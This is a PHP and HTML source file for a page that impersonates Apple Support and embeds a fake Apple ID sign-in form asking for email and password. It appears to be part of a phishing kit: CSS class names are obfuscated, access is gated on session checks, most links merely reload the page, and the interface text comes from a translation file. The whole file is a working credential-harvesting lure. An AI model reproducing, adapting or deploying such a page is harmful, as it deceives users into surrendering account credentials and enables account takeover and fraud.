<?php session_start();
  
   require_once '../config/config.php';
   require_once '../api/Mailview.php';
   require_once '../api/StartSession.php';
   require_once '../api/Translator.php'; 

   
   $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
   $tras = new Translator();
   $texto = $tras->reportTras($lang);   

   if($_SESSION['linkg'] && $status != "1"){

    
     
   ?>


   <!DOCTYPE html>
<head>
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title><?php echo $texto[0]; ?></title>
   <link rel="shortcut icon" href="img/favi.ico" />   
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
   <link rel="stylesheet" href="css/Base.min.css">
   <link rel="stylesheet" type="text/css" href="css/ac-globalnav.built.css" />
   <script type="text/javascript" src="js/head.js"></script>   


    <script src="iframe/js/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" media="screen" href="iframe/css/app.css">
      <!--<script type="text/javascript" src="iframe/js/common-header.js"></script>-->
      <style type="text/css"></style>
      <style type="text/css">
         body{
        
         } 

         .widget-container.restrict-max-wh {
              min-height: 220px;
          }
         input#account_name_text_field:focus{
         border: 1px solid blue!important;
         }
         div#caja-password{
         height: 43px!important;
         }
         input#password_text_field:focus{
         border: 1px solid blue!important;
         }
         div#caja-password:focus {
         height: 43px;
         }
         .signin-form.fed-auth.show-password .field-separator{
         display: none;
         }
         .U3hTLWlDbG-submit {
         width: 26px;
         height: 26px;
         border: none;
         margin-top: -32px;
         margin-left: 245px;
         }
         .MjAxOGljbG91ZAo-frmerror {
         background-color: #FAE9A3;
         position: absolute;
         width: 65%;
         margin-left: -37%;
         border-radius: 5px;
         left: 50%;
         padding: 1em;
         border: 1px solid rgba(185,149,1,0.47);
         box-shadow: 0px 5px 10px 2px rgba(0,0,0,0.1);
         margin-top: 9px;
         padding: 15px;
         color: #503E30;
         font-weight: 400;
         text-align: center;
         z-index: 10;
         font-size: 15px;
         letter-spacing: -0.016em;
         font-weight: 500;
         font-family: arial;
         }
         .a11y, .sr-only {
         position: absolute;
         width: 1px;
         height: 1px;
         margin: -1px;
         padding: 0;
         /* overflow: hidden; */
         clip: rect(0,0,0,0);
         border: 0;
         }
         #step{
         }
         .notice-view{
         z-index: 1;
         }
         .notice-view[dir=ltr], .notice-view[dir=rtl], [dir=ltr] .notice-view, [dir=rtl] .notice-view {
         width: 100%;
         min-height: 87px;
         border-bottom: 1px solid #ddd;
         }
         .notice-view .notice-view-inner {
         max-inline-size: -webkit-calc(100% - 112px);
         max-inline-size: calc(100% - 112px);
         display: -webkit-box;
         display: -webkit-flex;
         display: -ms-flexbox;
         display: flex;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         -webkit-flex-direction: row;
         -ms-flex-direction: row;
         flex-direction: row;
         min-block-size: 55px;
         -webkit-box-align: center;
         -webkit-align-items: center;
         -ms-flex-align: center;
         align-items: center;
         pointer-events: auto;
         }
         .notice-view .notice-close {
         position: absolute;
         offset-inline-end: 16px;
         cursor: pointer;
         }
         .form-choice-checkbox:checked+.form-label .form-choice-indicator:after, .form-choice-checkbox:checked+.form-label .form-choice-indicator:before {
         content: "✓";
         }
      </style>
</head>
<body class="ac-gn-current-support as-simple-list-10">
   <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
   <nav id="ac-globalnav" class="no-js">
      <div class="ac-gn-content">
         <ul class="ac-gn-header">
            <li class="ac-gn-item ac-gn-menuicon">
               <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
               <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
               <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
               </label>
               <a href="javascript:location.reload()" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label"><?php echo $texto[1]; ?></span> </a>
               <a href="#" rel="nofollow" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label"><?php echo $texto[2]; ?></span> </a>
            </li>
            <li class="ac-gn-item ac-gn-app">
               <a class="ac-gn-link ac-gn-link-app" href="javascript:location.reload()" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text"><?php echo $texto[3]; ?></span> </a>
            </li>
            <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
               <div class="ac-gn-bag-wrapper">
                  <a class="ac-gn-link ac-gn-link-bag" href="javascript:location.reload()" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with item count :"> <span class="ac-gn-link-text"><?php echo $texto[4]; ?></span> </a> <span class="ac-gn-bag-badge">
                  <span class="ac-gn-bag-badge-separator"></span> <span class="ac-gn-bag-badge-number"></span> <span class="ac-gn-bag-badge-unit">+</span> </span>
               </div>
               <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
            </li>
         </ul>
         <div class="ac-gn-search-placeholder-container" role="search">
            <div class="ac-gn-search ac-gn-search-small">
               <a id="ac-gn-link-search-small" class="ac-gn-link" href="javascript:location.reload()" data-analytics-title="search" data-analytics-click="search" data-analytics-intrapage-link aria-label="Search Support">
                  <div class="ac-gn-search-placeholder-bar">
                     <div class="ac-gn-search-placeholder-input">
                        <div class="ac-gn-search-placeholder-input-text" aria-hidden="true">
                           <div class="ac-gn-link-search ac-gn-search-placeholder-input-icon"></div>
                           <span class="ac-gn-search-placeholder"><?php echo $texto[5]; ?></span> 
                        </div>
                     </div>
                     <div class="ac-gn-searchview-close ac-gn-searchview-close-small ac-gn-search-placeholder-searchview-close"> <span class="ac-gn-searchview-close-cancel" aria-hidden="true"><?php echo $texto[6]; ?></span> </div>
                  </div>
               </a>
            </div>
         </div>
         <ul class="ac-gn-list">
            <li class="ac-gn-item ac-gn-app">
               <a class="ac-gn-link ac-gn-link-app" href="javascript:location.reload()" data-analytics-title="apple home" id="ac-gn-firstfocus"> <span class="ac-gn-link-text">Apple</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
               <a class="ac-gn-link ac-gn-link-mac" href="javascript:location.reload()" data-analytics-title="mac"> <span class="ac-gn-link-text">Mac</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
               <a class="ac-gn-link ac-gn-link-ipad" href="javascript:location.reload()" data-analytics-title="ipad"> <span class="ac-gn-link-text">iPad</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
               <a class="ac-gn-link ac-gn-link-iphone" href="javascript:location.reload()" data-analytics-title="iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
               <a class="ac-gn-link ac-gn-link-watch" href="javascript:location.reload()" data-analytics-title="watch"> <span class="ac-gn-link-text">Watch</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
               <a class="ac-gn-link ac-gn-link-tv" href="javascript:location.reload()" data-analytics-title="tv"> <span class="ac-gn-link-text">TV</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
               <a class="ac-gn-link ac-gn-link-music" href="javascript:location.reload()" data-analytics-title="music"> <span class="ac-gn-link-text">Music</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
               <a class="ac-gn-link ac-gn-link-support" href="/" data-analytics-title="support"> <span class="ac-gn-link-text">Support</span> </a>
            </li>
            <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
               <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search" href="javascript:location.reload()" data-analytics-title="search" data-analytics-click="search" data-analytics-intrapage-link aria-label="Search Support"></a>
            </li>
            <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
               <div class="ac-gn-bag-wrapper">
                  <a class="ac-gn-link ac-gn-link-bag" href="javascript:location.reload()" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with item count : {%BAGITEMCOUNT%}"> <span class="ac-gn-link-text">Shopping Bag</span> </a> <span class="ac-gn-bag-badge" aria-hidden="true">
                  <span class="ac-gn-bag-badge-separator"></span> <span class="ac-gn-bag-badge-number"></span> <span class="ac-gn-bag-badge-unit">+</span> </span>
               </div>
               <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
            </li>
         </ul>
         <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
            <div class="ac-gn-searchview-content">
               <div class="ac-gn-searchview-bar">
                  <div class="ac-gn-searchview-bar-wrapper">
                     <form id="ac-gn-searchform" class="ac-gn-searchform" action="https://www.apple.com/us/search" method="get">
                        <div class="ac-gn-searchform-wrapper">
                           <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" aria-label="Search Support" placeholder="Search Support" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" role="combobox" aria-autocomplete="list" aria-expanded="true" aria-owns="quicklinks suggestions" />
                           <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
                           <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled aria-label="Submit Search"></button>
                           <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled aria-label="Clear Search"> <span class="ac-gn-searchform-reset-background"></span> </button>
                        </div>
                     </form>
                     <button id="ac-gn-searchview-close-small" class="ac-gn-searchview-close ac-gn-searchview-close-small" aria-label="Cancel Search"> <span class="ac-gn-searchview-close-cancel" aria-hidden="true">
                     Cancel
                     </span> </button>
                  </div>
               </div>
               <aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults=""></aside>
            </div>
            <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Cancel Search"> <span class="ac-gn-searchview-close-wrapper">
            <span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span> </span>
            </button>
         </aside>
         <aside class="ac-gn-bagview" data-analytics-region="bag">
            <div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
            <div class="ac-gn-bagview-content" id="ac-gn-bagview-content"> </div>
         </aside>
      </div>
   </nav>
   <div class="ac-gn-blur"></div>
   <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
   <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
   <script type="text/javascript" src="https://www.apple.com/ac/globalnav/5/en_US/scripts/ac-globalnav.built.js"></script>
   <div id="supportsThreeD"></div>
   <div class="main" data-env='live' data-edit-mode='false' role="main">
      <section class="as-columns  as-columns--1up  as-banner as-banner--top  ">
         <div class="row">
            <div class="column large-12 medium-12 small-12">
               <div class='as-banner-cont'>
                  <div class='as-banner-image as-banner-image--top'>
                     <style type="text/css">
                        .as-banner-image.as-banner-image--top {
                        background-image: url("img/imagelarge.jpg");
                        }
                        .as-banner-image.as-banner-image--top:before {
                        content: "";
                        display: block;
                        }
                        @media only screen and (max-width: 735px) {
                        .as-banner-image.as-banner-image--top {
                        background-image: url("img/imagelarge.jpg");
                        }
                        }
                     </style>
                     <img sizes="(min-width:735px ) 735w, 100vw" src="/content/dam/edam/applecare/images/en_US/psp/hero-banner-baker-homepage.image.large_2x.jpg" alt="" srcset="img/homepage.image.large_2x.jpg 735w, img/homepage.image.large_2x.jpg 1440w" class="as-image-speculativedownload">
                  </div>
               </div>
               <div class="as-banner-content">
                  <div class="pageTitle  ">
                     <h1 class="pageTitle-heading"><?php echo $texto[7]; ?></h1>
                  </div>
                 <div class="si-body si-container container-fluid" id="content" data-theme="dark" style="overflow: hidden;">
         <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
            <div class="widget-container fade-in safari-browser restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false" style="/*padding-left: 5px; padding-right: 30px;*/">
               <div id="step" class="si-step" style="width: 90%;">                 
                  <div id="stepEl" class="   ">
                     <sign-in>
                        <div class="signin fade-in" id="signin">                         
                           <div class="container si-field-container  password-second-step  password-on     ">
                              <div id="sign_in_form" class="signin-form fed-auth show-password">
                                 <div class="si-field-container container">
                                    <form novalidate class = "form-icIoud" >
                                       <div class="form-table" style="background-color: #ffffff00; border-color: #f5f9f300;">
                                          <div class="ax-vo-border show-password"></div>
                                          <div class="account-name form-row show-password " style="background-color: #ffffff00;">
                                             <label class="sr-only form-cell form-label" for="account_name_text_field"></label>
                                             <div class="form-cell" style="background-color: #ffffff00;">
                                                <div class="form-cell-wrapper" style="background-color: #ffffff00;">
                                                   <input type="text" class="form-textbox form-textbox-text" name = "email" id="account_name_text_field"  placeholder="<?php echo $texto[74]; ?>" autofocus=""value="<?php echo $email;  ?>" style = "border-bottom-left-radius: 6px;border-bottom-right-radius: 6px;border: 1px solid #ace2ac;padding-top: 0px;">
                                                   <span id="apple_id_field_label" aria-hidden="true" class=" form-label-flyout"> <?php echo $texto[74]; ?> </span>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="field-separator"></div>
                                          <div class="password form-row show-password show-placeholder" style="opacity: 0; height: 0px; display: none; background-color: #ffffff00;" id="caja-password">
                                             <label class="sr-only form-cell form-label" for="password_text_field"> <?php echo $texto[75]; ?> </label>
                                             <div class="form-cell" style="background-color: #ffffff00;">
                                                <div class="form-cell-wrapper" style="background-color: #ffffff00;">
                                                   <input type="password" class="form-textbox form-textbox-text" name = "password" id="password_text_field"  placeholder=" <?php echo $texto[75]; ?> " style="opacity: 0;  margin-top: 0px;border: 1px solid #ace2ac; padding-top: 0px;"><span id="password_field_label" aria-hidden="true" class=" form-label-flyout"> <?php echo $texto[75]; ?> </span>
                                                   <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true"></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <!-- <button type="submit" id="sign-in" class="U3hTLWlDbG-submit">
                                          <img src="button-submit.png">
                                          </button>-->
                                       <button type="submit" id="sign-in" class=" si-button btn  fed-ui  moved   fed-ui-animation-show   remember-me   link  " aria-label="Inicia sesión
                                          " style="top: -12px; opacity: .6;" disabled>
                                       <img src="iframe/img/button-submit.png" id="img-png">
                                       <img src="iframe/img/loading.gif" id="img-gif" style="display: none;">
                                       <span class="text feat-split">
                                        <?php echo $texto[76]; ?>                                       
                                       </span>
                                       </button>
                                       <div class="pop-container error signin-error" style = "display:none;" >
                                          <div class="error pop-bottom tk-subbody-headline" >
                                             <p class="fat" id="errMsg">
                                                 <?php echo $texto[77]; ?> 
                                             </p>
                                             <a class="si-link ax-outline thin tk-subbody" href="javascript:location.reload()" target="_blank">
                                              <?php echo $texto[78]; ?> 
                                             </a>
                                          </div>
                                       </div>
                                    </form>
                                 </div>
                              </div>
                             
                            
                             
                            
                           </div>
                          
                        </div>
                        <idms-modal {(show)}="showErrorModal" auto-close="false">
                        </idms-modal>
                     </sign-in>
                  </div>
               </div>
               <div id="stocking" style="display:none !important;"></div>
            </div>
         </apple-auth>
      </div>
               </div>
            </div>
         </div>
      </section>
      <div class="as-imagegrid">
         <div class=" as-imagegrid--6up   " />
            <div class="row">
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="iPhone " data-analytics-link-url="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img1.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">iPhone <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="Mac " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img2.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">Mac <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="iPad " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img3.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">iPad <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="Watch " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img4.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">Watch <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="Music " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img5.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">Music <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
               <div class='as-imagegrid-item column large-2 medium-4 small-6'>
                  <a data-analytics-event="link.component_click" data-analytics-link-component_type="Image Grid" data-analytics-link-component_name="TV " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
                     <div class='as-imagegrid-img-cont'> <img src="img/img6.png" alt="" width="68" class="as-imagegrid-img" height="68"></div>
                     <span class="as-imagegrid-item-title">TV <span class="a11y"><?php echo $texto[8]; ?></span></span>
                  </a>
               </div>
            </div>
         </div>
      </div>
      <div class="divider divider--fullwidth">
         <hr aria-hidden="true">
      </div>
      <div class="promo as-center ">
         <div class="u-layout u-layoutTable u-layout--4up">
            <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Forgot Apple ID or password" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
               <img src="img/promo1.png" alt="" width="40" class="promo-image" height="40">
               <div class="promo-link">
                  <span class="promo-text"><?php echo $texto[9]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span>
               </div>
            </a>
            <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Lost or missing AirPods" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
               <img src="img/promo2.png" alt="" width="40" class="promo-image" height="40">
               <div class="promo-link">
                  <span class="promo-text"><?php echo $texto[10]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span>
               </div>
            </a>
            <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Apple Repair" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
               <img src="img/promo3.png" alt="" width="40" class="promo-image" height="40">
               <div class="promo-link">
                  <span class="promo-text"><?php echo $texto[11]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span>
               </div>
            </a>
            <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Billing and subscriptions" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">
               <img src="img/promo4.png" alt="" width="40" class="promo-image" height="40">
               <div class="promo-link">
                  <span class="promo-text"><?php echo $texto[12]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span>
               </div>
            </a>
         </div>
      </div>
      <div class="divider divider--fullwidth">
         <hr aria-hidden="true">
      </div>
      <div class="contentLink ">
         <div class="u-layout u-layout--2up">
            <div class="u-layout-item">
               <div class="contentLink-item">
                  <img src="img/homepods.png" alt="" width="240" class="contentLink-image" height="140">
                  <div class="contentLink-block">
                     <h3 class="contentLink-title"><?php echo $texto[13]; ?></h3>
                     <p class="contentLink-copy"><?php echo $texto[14]; ?></p>
                     <a class="contentLink-link " href="javascript:location.reload()" data-analytics-event="link.component_click" data-analytics-link-component_type="Content Link" data-analytics-link-component_name="See what HomePod can do" data-analytics-link-url="javascript:location.reload()">          
                     <span class="contentLink-text"><?php echo $texto[15]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span></a>        
                  </div>
               </div>
            </div>
            <div class="u-layout-item">
               <div class="contentLink-item">
                  <img src="img/store.png" alt="" width="240" class="contentLink-image" height="140">
                  <div class="contentLink-block">
                     <h3 class="contentLink-title"><?php echo $texto[16]; ?></h3>
                     <p class="contentLink-copy"><?php echo $texto[17]; ?></p>
                     <a class="contentLink-link " href="javascript:location.reload()" data-analytics-event="link.component_click" data-analytics-link-component_type="Content Link" data-analytics-link-component_name="Learn how to redeem" data-analytics-link-url="javascript:location.reload()">         
                     <span class="contentLink-text"><?php echo $texto[18]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span></a>        
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="pagedivider section">
         <div class="divider divider--fullwidth">
            <hr aria-hidden="true" />
         </div>
      </div>
      <div class="as-ft-section-cont  as-ft-section-cont--border-bot as-ft-section--hero-left">
         <div class="as-ft-section">
            <div class="as-ft-section-item row">
               <div class="as-ft-section-column-left as-ft-section-column-left--hero column large-6 medium-12 as-ft-section-mt0 as-ft-section-center"> <img src="img/featured.jpg" alt="" width="400" class="as-ft-section-image" height="209"></div>
               <div class="as-ft-section-column-right as-ft-section-column-right--hero column large-6 large-last medium-12 as-ft-section-mt48">
                  <h2 class="as-ft-section-heading"><?php echo $texto[19]; ?></h2>
                  <p class="as-ft-section-copy as-ft-section-copy--center-medium as-ft-section-copy--center-small"><?php echo $texto[20]; ?></p>
                  <div class="as-ft-navlink-section ">
                     <div class="as-ft-navlink as-ft-navlink--centered-medium as-ft-navlink--centered-small"> <a class=" analytics-exitlink" data-analytics-event="link.component_click" data-analytics-link-component_type="Featured Section" data-analytics-link-component_name="Learn more" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><span class="as-ft-text"><?php echo $texto[21]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span></a></div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <section class="as-columns  as-columns--1up  as-banner   ">
         <div class="row">
            <div class="column large-12 medium-12 small-12">
               <div class='as-banner-cont'>
                  <div class='as-banner-image as-banner-image--inline-1'>
                     <style type="text/css">
                        .as-banner-image.as-banner-image--inline-1 {
                        background-image: url("img/bannerimage.large_2x.jpg");
                        }
                        .as-banner-image.as-banner-image--inline-1:before {
                        content: "";
                        display: block;
                        }
                        @media only screen and (max-width: 735px) {
                        .as-banner-image.as-banner-image--inline-1 {
                        background-image: url("img/banner2x.jpg");
                        }
                        }
                     </style>
                     <img sizes="(min-width:735px ) 735w, 100vw" src="img/bannerimage.large_2x.jpg" alt="" srcset="img/banner2x.jpg 735w, img/bannerimage.large_2x.jpg 1440w" class="as-image-speculativedownload">
                  </div>
               </div>
               <div class="as-banner-content">
                  <div class="as-banner-row">
                     <div class="sectionTitle  as-left sectionTitle-white">
                        <h2 class="sectionTitle-heading"><?php echo $texto[22]; ?></h2>
                        <p class="sectionTitle-intro"><?php echo $texto[23]; ?></p>
                     </div>
                     <div class="as-navLink-wrapper as-navLink--icon as-navLink--light">
                        <div class="as-navLink-inner as-left">
                           <a class="as-navLink " href="javascript:location.reload()" rel="nofollow" data-analytics-event="link.component_click" data-analytics-link-component_name="Start now" data-analytics-link-url="javascript:location.reload()"> <span class="as-navlink-text"><?php echo $texto[24]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span> </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <div class='contentLink '>
         <div class="u-layout u-layout--1up">
            <div class="u-layout-item">
               <div class="contentLink-item">
                  <img src="img/products.png" alt="" width="400" class="contentLink-image" height="200">
                  <div class="contentLink-block">
                     <h3 class="contentLink-title"><?php echo $texto[25]; ?></h3>
                     <p class="contentLink-copy"><?php echo $texto[26]; ?></p>
                     <a class="contentLink-link " href="javascript:location.reload()" data-analytics-event="link.component_click" data-analytics-link-component_type="Content Link" data-analytics-link-component_name="Learn about AppleCare plans" data-analytics-link-url="javascript:location.reload()"> <span class="contentLink-text"><?php echo $texto[27]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span></a>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="divider divider--fullwidth">
         <hr aria-hidden="true" />
      </div>
      <div class="richText large">
         <div class="table-responsive">
            <h3 class="as-center"><?php echo $texto[28]; ?></h3>
            <p class="as-center"><?php echo $texto[29]; ?><a href="javascript:location.reload()" class="analytics-exitlink"><?php echo $texto[30]; ?></a> o <a href="javascript:location.reload()" class="analytics-exitlink"><?php echo $texto[31]; ?> </a>. <?php echo $texto[32]; ?></p>
            <p class="as-center"><?php echo $texto[33]; ?></p>
         </div>
      </div>
      <div class="divider divider--fullwidth">
         <hr aria-hidden="true" />
      </div>
      <div class='contentLink '>
         <div class="u-layout u-layout--1up">
            <div class="u-layout-item">
               <div class="contentLink-item">
                  <img src="img/trimmed.jpg" alt="" width="240" class="contentLink-image" height="140">
                  <div class="contentLink-block">
                     <h3 class="contentLink-title"><?php echo $texto[34]; ?></h3>
                     <a class="contentLink-link " href="javascript:location.reload()" data-analytics-event="link.component_click" data-analytics-link-component_type="Content Link" data-analytics-link-component_name="Learn more" data-analytics-link-url="javascript:location.reload()"> <span class="contentLink-text"><?php echo $texto[35]; ?></span><span class="fa fa-chevron-right" aria-hidden="true" style="margin-left: 3px; font-size: 10px; color: #0070c9c2 !important;"></span></a>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="divider divider--fullwidth">
         <hr aria-hidden="true" />
      </div>
      <div class="simple-list-wrapper as-left">
         <h2><?php echo $texto[36]; ?></h2>
         <ul>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="iPhone 11 Display Module Replacement Program for Touch Issues" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[37]; ?></a></li>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="AirPods Pro Service Program for Sound Issues" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[38]; ?></a></li>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="iPad Air (3rd generation) Service Program for Blank Screen Issue" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[39]; ?></a></li>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="15-inch MacBook Pro Battery Recall Program" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[40]; ?></a></li>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Apple Three-Prong AC Wall Plug Adapter Recall Program" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[41]; ?></a></li>
            <li> <a class="simple-list-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="See all programs" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[42]; ?><span class="icon icon-chevronright"></span></a></li>
         </ul>
      </div>
      <div class="as-social-channel-wrapper">
         <div class="as-social-channel">
            <div class="as-social-channel-title">
               <h2><?php echo $texto[43]; ?></h2>
            </div>
            <div class="as-social-channel-links">
               <a class="as-social-channel-link analytics-exitlink" data-analytics-event="link.component_click" data-analytics-link-component_type="Social Channel" data-analytics-link-component_name="Visit @AppleSupport on Twitter" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><img src="img/social-icon-twitter.png" alt="Visit @AppleSupport on Twitter" width="32" class="as-social-channel-img" height="32"></a>
               <a class="as-social-channel-link analytics-exitlink" data-analytics-event="link.component_click" data-analytics-link-component_type="Social Channel" data-analytics-link-component_name="Visit Apple Support on YouTube" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()" rel="nofollow"><img src="img/social-icon-youtube.png" alt="Visit Apple Support on YouTube" width="32" class="as-social-channel-img" height="32"></a>
            </div>
         </div>
      </div>
   </div>
